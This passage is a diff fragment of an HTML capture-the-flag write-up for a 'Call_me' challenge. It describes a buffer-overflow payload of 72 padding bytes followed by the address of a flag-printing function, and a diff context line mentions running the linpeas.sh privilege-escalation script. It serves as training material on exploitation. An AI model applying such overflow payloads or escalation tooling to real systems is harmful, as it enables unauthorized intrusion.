                 <p>The source identifies yo_chat_is_this_real at 0x40123b as the only useful target. The documented payload structure is therefore 72 padding bytes followed by that address in the target’s byte order.</p>
+
                 <p class="code-language">text</p>
                 <pre><code>padding (72 bytes) + address of yo_chat_is_this_real (0x40123b)</code></pre>
 
@@ -889,6 +963,7 @@ chmod +x linpeas.sh
               </li>
               <li class="solve-step"><h4>Run the payload and read the output</h4>
                 <p>Executing the exploit redirected the function pointer to the flag-printing function.</p>
+
 
                 <figure><img class="writeup-figure" src="../assets/writeups/kernel-zero/call-me-result.webp" alt="The exploit result prints the Call_me flag." loading="lazy"><figcaption>The exploit result prints the Call_me flag.</figcaption></figure>
 
